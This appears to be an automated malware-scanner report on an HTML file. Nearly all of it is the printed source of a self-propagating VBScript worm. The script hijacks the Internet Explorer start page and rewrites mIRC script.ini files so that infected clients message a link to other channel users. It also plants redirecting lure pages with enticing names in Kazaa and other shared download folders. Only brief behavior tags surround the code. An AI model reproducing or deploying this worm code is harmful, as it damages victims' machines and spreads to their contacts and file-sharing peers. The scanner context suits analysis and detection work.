behavior.Shell: May run an executable file or a system command
behavior.Wscript.Shell: May run an executable file or a system command

docinfo.macro:
<html>
<head>
<script language="VBScript"><!-- 
On Error Resume Next
dim wyytds, beehwh, rebufu, rkujit, qc
dim cwnupr, pzpwpo, tqxhwf
rebufu = "http://microsoft.com/text/abc.gif"
rkujit = " ;)"
cwnupr = "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DownloadDir"
tqxhwf = Array("\sexy chickz 2005.htm", "\xxx passes deluxe.htm", "\xbox360 iso guide.htm")
Set wyytds=CreateObject("Scripting.FileSystemObject")
Set beehwh=CreateObject("Wscript.Shell")
beehwh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", rebufu
pzpwpo = beehwh.regread(cwnupr)
algokhgi("C:\mIRC\script.ini")
algokhgi("C:\Program Files\mIRC\script.ini")
algokhgi("C:\Programme\mIRC\script.ini")
for i=0 to 2
sibxgq(pzpwpo & tqxhwf(i))
sibxgq("C:\Downloads\" & tqxhwf(i))
sibxgq("C:\My Downloads\" & tqxhwf(i))
sibxgq("C:\My Shared Folder\" & tqxhwf(i))
sibxgq("C:\Sharing\" & tqxhwf(i))
next
Sub algokhgi(scrglzq)
Set qc=wyytds.CreateTextFile(scrglzq) 
qc.WriteLine "[script]"
qc.WriteLine "n0=on 1:JOIN:#:if ($nick != $me) { /msg $nick " + rebufu + rkujit + " } "
qc.WriteLine "n1=on 1:PART:#:if ($nick != $me) { /msg $nick " + rebufu + rkujit + " } "
qc.WriteLine "n2=on 1:KICK:#:if ($nick != $me) { /msg $nick " + rebufu + rkujit + " } "
qc.WriteLine "n3=on 1:TOPIC:#:if ($nick != $me) { /msg $chan " + rebufu + rkujit + " } "
qc.Close()
End Sub
Sub sibxgq(scrglzq)
Set qc=wyytds.CreateTextFile(scrglzq)
qc.WriteLine "<meta http-equiv='refresh' content='0;URL=" + rebufu + "'>"
qc.Close()
End Sub
--></script>
</head>
<body>
</body>
</html>

filetype: HTML document, ASCII text, with CRLF line terminators

dump: dim wyytds, beehwh, rebufu, rkujit, qc
tqxhwf = Array("\sexy chickz 2005.htm", "\xxx passes deluxe.htm", "\xbox360 iso guide.htm")
